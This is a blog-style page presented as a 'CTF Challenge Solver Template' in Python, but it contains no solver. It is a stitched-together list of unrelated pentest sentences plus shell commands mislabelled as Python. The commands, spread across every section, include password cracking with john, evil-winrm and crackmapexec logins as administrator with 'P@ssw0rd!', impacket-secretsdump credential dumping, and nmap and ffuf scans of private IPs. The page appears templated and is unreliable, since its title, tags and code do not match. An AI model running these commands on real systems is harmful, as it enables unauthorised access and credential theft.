---
TitleSEO: "CTF Challenge Solver Template in Python | ZureFX"
TitlePost: "CTF Challenge Solver Template — Python"
Author: "ZureFX"
Description: "A Python script for ctf challenge solver template. Built for security research and automation."
Keywords: "rust, powershell, go, bash, python"
URL: "https://zurefx.github.io/scripting/script-ctf-challenge-solver-template-373.html"
URL_IMAGES: ""
Date: "2024-09-10"
Tags: "Rust, PowerShell, Go, Bash, Python"
Section: "scripting"
Lang: "en"
main_img: "script-ctf-challenge-solver-template-373"
Permalink: "/scripting/script-ctf-challenge-solver-template-373.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `hydra`
- `evil-winrm`
- `GetUserSPNs`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

```python
evil-winrm -i 10.101.245.149 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p139,636,389 10.12.250.207 -oN scan.txt
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.101.120.237 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.86.17.110/FUZZ
nmap -sCV -p1521,25,389 10.21.226.233 -oN scan.txt
```

### Advanced Options

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.191.186
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 1.90s
```
